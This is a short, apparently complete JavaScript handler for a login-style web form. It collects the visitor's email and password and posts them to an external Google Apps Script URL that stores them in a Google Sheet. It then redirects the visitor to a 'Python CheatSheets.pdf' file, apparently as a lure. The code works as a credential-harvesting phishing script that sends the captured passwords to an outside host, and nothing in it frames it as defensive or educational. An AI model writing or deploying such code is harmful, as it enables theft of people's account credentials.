document.getElementById("nextBtn").addEventListener("click", async function (event) {
  event.preventDefault(); // Prevent default form submission

  // Collect data
  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  // Validate inputs
  if (!email || !password) {
    alert("Please fill in both email and password fields.");
    return;
  }

  // Send data to Google Sheets via Google Apps Script
  try {
    const response = await fetch("https://script.google.com/macros/s/AKfycbxJN-avFIkvouUJGzK53SqfHImi6BWgu7a_jE6y0SK0tU1XHOC7C6D_p5-j3zKHb4bN/exec", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ email, password }),
    });

    const result = await response.text();
    if (response.ok) {
      alert("Data saved successfully!");
      window.location.href = "Python CheatSheets.pdf"; // Redirect to your document
    } else {
      alert("Failed to save data: " + result);
    }
  } catch (error) {
    console.error("Error:", error);
    alert("An error occurred while saving data.");
  }
});
